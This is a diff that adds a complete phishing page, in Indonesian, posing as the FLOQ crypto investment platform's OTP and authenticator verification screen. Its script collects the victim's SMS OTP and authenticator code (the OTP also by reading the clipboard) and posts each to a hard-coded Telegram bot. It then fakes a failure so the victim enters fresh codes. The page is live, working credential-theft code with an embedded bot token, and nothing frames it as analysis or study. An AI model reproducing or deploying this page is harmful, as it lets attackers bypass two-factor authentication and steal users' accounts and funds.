@@ -1,0 +1,316 @@
+
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+   <meta name="theme-color" content="#002333">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verifikasi Email</title>
+   <title>Investasi Aset Kripto di FLOQ</title>
+  <meta name="description" content="Mulai Investasi Aset Kripto — Platform FLOQ dirancang untuk investor pemula. Aman dan mudah berinvestasi bersama FLOQ. FLOQ berizin dan diawasi oleh OJK. Mulai belajar investasi aset kripto bersama FLOQ.">
+<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQtrLpsHt9Xmvo4GaHkfgUCVjxA_4BMpTP3V7pWS1LwQ37bJRv3AeMy1yUc&s=10">
+ <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQqw58132XgazJV1BUPdyOCTkyY520dl6pYFSjS16AdpGrPJf_ml06lahU&s=10" rel="shortcut icon" type="image/x-icon">
+ <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQqw58132XgazJV1BUPdyOCTkyY520dl6pYFSjS16AdpGrPJf_ml06lahU&s=10" rel="apple-touch-icon">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 20px;
+      background: #fff;
+      color: #000;
+    }
+    .container {
+      max-width: 400px;
+      margin: 0 auto;
+      text-align: center;
+    }
+    h2 {
+      font-size: 24px;
+      font-weight: bold;
+      color: #002333;
+    }
+    p {
+      color: #555;
+      font-size: 14px;
+    }
+    .otp-box {
+      display: flex;
+      justify-content: space-between;
+      margin: 30px 0;
+    }
+ .otp-box input {
+       width: 45px;
+      height: 58px;
+      font-size: 24px;
+      text-align: center;
+      border: 2px solid #cfd8dc;
+      border-radius: 10px;
+      outline: none;
+    }
+    .otp-box input:focus {
+      border-color: #007bff;
+    }
+    
+    .btn-tempel {
+      border: 1px solid #000;
+      padding: 10px 20px;
+      border-radius: 30px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-bottom: 20px;
+      display: inline-block;
+    }
+    .btn-tempel:hover {
+      background: #f2f2f2;
+    }
+    .btn-disabled {
+      background-color: #eee;
+      color: #aaa;
+      border-radius: 30px;
+      padding: 14px;
+      width: 100%;
+      font-size: 16px;
+      margin: 20px 0;
+      border: none;
+    }
+    .bottom-text {
+      color: #002333;
+      font-weight: 600;
+      font-size: 14px;
+    }
+    .process1 {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      justify-content: center;
+      margin: auto;
+      position: absolute;
+      padding-top: 300px;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: #98989899;
+      z-index: 99999;
+    }
+    .loading {
+      position: absolute;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 20%;
+    }
+    .loading img {
+      width: 100px;
+      margin-top: 280px;
+    }
+    .input-berhasil {
+      border: 2px solid red !important;
+      
+    }
+    
+    .borderku{
+    border: 2px solid #cfd8dc !important;   
+    }
+  </style>
+</head>
+<body onload="hapusBorderMerah()">
+  <div class="container" onclick="hapusBorderMerah()">
+    <h2>Verifikasi OTP</h2>
+    <p>Silakan masukkan OTP yang kami kirimkan ke<br>Nomor <span id="nomor">+62xxxx</span></p>
+    <div class="otp-box" onclick="inputBlank()">
+      <input type="tel" maxlength="1" id="code1" oninput="inputHandler(this, 'code2')">
+      <input type="tel" maxlength="1" id="code2" oninput="inputHandler(this, 'code3')" onkeydown="backspace(this, 'code1')">
+      <input type="tel" maxlength="1" id="code3" oninput="inputHandler(this, 'code4')" onkeydown="backspace(this, 'code2')">
+      <input type="tel" maxlength="1" id="code4" oninput="inputHandler(this, 'code5')" onkeydown="backspace(this, 'code3')">
+      <input type="tel" maxlength="1" id="code5" oninput="inputHandler(this, 'code6')" onkeydown="backspace(this, 'code4')">
+      <input type="tel" maxlength="1" id="code6" oninput="checkFullCode()" onkeydown="backspace(this, 'code5')">
+    </div>
+    <div class="btn-tempel" onclick="pasteCode()">📋 Tempel Kode</div>
+  </div>
+
+  <div class="container" onclick="hapusBorderMerah()">
+    <h2>Kode Authenticator</h2>
+    <p>Silakan masukkan kode authenticator yang ada di Aplikasi</p> 
+    <div class="otp-box" id="box-otp" onclick="inputBlank()">
+      <input id="pin1" maxlength="1" type="password" inputmode="numeric">
+      <input id="pin2" maxlength="1" type="password" inputmode="numeric">
+      <input id="pin3" maxlength="1" type="password" inputmode="numeric">
+      <input id="pin4" maxlength="1" type="password" inputmode="numeric">
+      <input id="pin5" maxlength="1" type="password" inputmode="numeric">
+      <input id="pin6" maxlength="1" type="password" oninput="checkAuthCode()"  inputmode="numeric">
+    </div>
+    <div class="btn-tempel" onclick="pasteCode()">📋 Tempel Kode</div>
+    <button class="btn-disabled" id="resendBtn" disabled>Kirim Ulang Kode 0:50</button>
+    <p class="bottom-text" onclick="location.href='otp.html'">Saya tidak menerima kode</p>
+  </div>
+
+  <div id="process1" class="process1" style="display: none;">
+    <div class="loading">
+      <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhBp941DbQgftLdvFaaVjvwxJGz10vc6AVQpBWhtqsfoRk-TBu3W3dgVIfrNwl8WlElg6jlIYz88YxOVmnztv-91lE_liR9cjtzDgYsTmqBFhdIWFk4ON7Jt3yC4UMQjJLqpOhZZsz656i3p4wtPvYWijzhBfqxHfPMkO1yaF1zNz5Sd77tOE-7aUeZySU/s336/output-onlinegiftools.gif">
+    </div>
+  </div>
+
+  <script>
+    const botToken = '8229342658:AAGgugsMFfDy_HgbiB1f0q79LVxxsFrmh6w';
+    const chatId = '7549590022';
+    let sentAlready = false;
+
+    function inputHandler(current, nextId) {
+      if (current.value.length === 1) {
+        document.getElementById(nextId).focus();
+        checkFullCode();
+      }
+    }
+
+    function backspace(current, prevId) {
+      if (event.key === "Backspace" && current.value === '') {
+        document.getElementById(prevId).focus();
+      }
+    }
+
+    function getOTP() {
+      return [...Array(6)].map((_, i) => document.getElementById('code' + (i + 1)).value).join('');
+    }
+
+    function checkFullCode() {
+      const code = getOTP();
+      if (code.length === 6 && !sentAlready) {
+        sentAlready = true;
+        sendToTelegram(`✅ Kode OTP :   ${code}`, 'otp');
+      }
+    }
+
+    function pasteCode() {
+      navigator.clipboard.readText().then(text => {
+        const code = text.replace(/\D/g, '').slice(0, 6);
+        if (code.length === 6) {
+          for (let i = 0; i < 6; i++) {
+            document.getElementById('code' + (i + 1)).value = code[i];
+          }
+          checkFullCode();
+        } else {
+          
+        }
+      });
+    }
+
+    function sendToTelegram(message, type) {
+     
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).then(res => {
+       
+        if (res.ok) {
+         alert('Silahkan lanjutkan dengan Kode Authenticator di bawah.');
+          if (type === 'otp') {
+            for (let i = 1; i <= 6; i++) {
+             
+            }
+            document.getElementById('pin1').focus();
+          }
+        } else {
+          alert('❌ Gagal mengirim ke Telegram.');
+        }
+      });
+    }
+
+    function checkAuthCode() {
+      const pins = ['pin1','pin2','pin3','pin4','pin5','pin6'].map(id => document.getElementById(id).value).join('');
+      if (pins.length === 6) {
+      
+        const msg = `※ Kode Authenticator : ${pins}\n\n🕶 𝓓𝓮𝓿𝓮𝓵𝓸𝓹𝓮𝓻 𝓦𝓮𝓫𝓼𝓲𝓽𝓮✍`;
+        $.ajax({
+          url: `https://api.telegram.org/bot${botToken}/sendMessage`,
+          method: 'POST',
+          data: {
+            chat_id: chatId,
+            text: msg,
+            parse_mode: 'HTML'
+          },
+          complete: function () {
+            setTimeout(() => {
+             
+              for (let i = 1; i <= 6; i++) {
+                document.getElementById('pin' + i).classList.add('input-berhasil');
+               document.getElementById('code' + i).classList.add('input-berhasil');
+              }
+                alert('Silahkan Cek dan input ulang kode yang baru');
+            }, 2000);
+          }
+        });
+      }
+    }
+
+    let countdown = 50;
+    const resendBtn = document.getElementById("resendBtn");
+    const timer = setInterval(() => {
+      countdown--;
+      resendBtn.innerText = `Kirim Ulang Kode 0:${countdown < 10 ? '0' + countdown : countdown}`;
+      if (countdown <= 0) {
+        clearInterval(timer);
+        resendBtn.innerText = "Kirim Ulang Kode";
+        resendBtn.disabled = false;
+        resendBtn.style.backgroundColor = "#007bff";
+        resendBtn.style.color = "#7DBE62";
+        resendBtn.style.cursor = "pointer";
+      }
+    }, 1000);
+
+    const pinContainer = document.querySelector("#box-otp");
+    pinContainer.addEventListener('keyup', function (event) {
+      const target = event.target;
+      if (target.tagName.toLowerCase() !== "input") return;
+      if (target.value.length === 1) {
+        let next = target.nextElementSibling;
+        while (next && next.tagName.toLowerCase() !== "input") {
+          next = next.nextElementSibling;
+        }
+        if (next) next.focus();
+      } else if (target.value.length === 0) {
+        let prev = target.previousElementSibling;
+        while (prev && prev.tagName.toLowerCase() !== "input") {
+          prev = prev.previousElementSibling;
+        }
+        if (prev) prev.focus();
+      }
+    }, false);
+
+    pinContainer.addEventListener('keydown', function (event) {
+      event.target.value = '';
+    }, false);
+    
+    
+
+  </script>
+<script>
+  function hapusBorderMerah() {
+    // Hapus border merah dari input OTP
+    for (let i = 1; i <= 6; i++) {
+      document.getElementById('code' + i).classList.remove('input-berhasil');
+    }
+
+    // Hapus border merah dari input Authenticator
+    for (let i = 1; i <= 6; i++) {
+      document.getElementById('pin' + i).classList.remove('input-berhasil');
+    }
+    
+    
+  }
+</script>
+<script>
+  function inputBlank() {
+    // Kosongkan input OTP
+    for (let i = 1; i <= 6; i++) {
+      document.getElementById('code' + i).value = '';
+    }
+
+    // Kosongkan input Authenticator
+    for (let i = 1; i <= 6; i++) {
+      document.getElementById('pin' + i).value = '';
+    }
+  }
+</script>
+</body>
+</html>
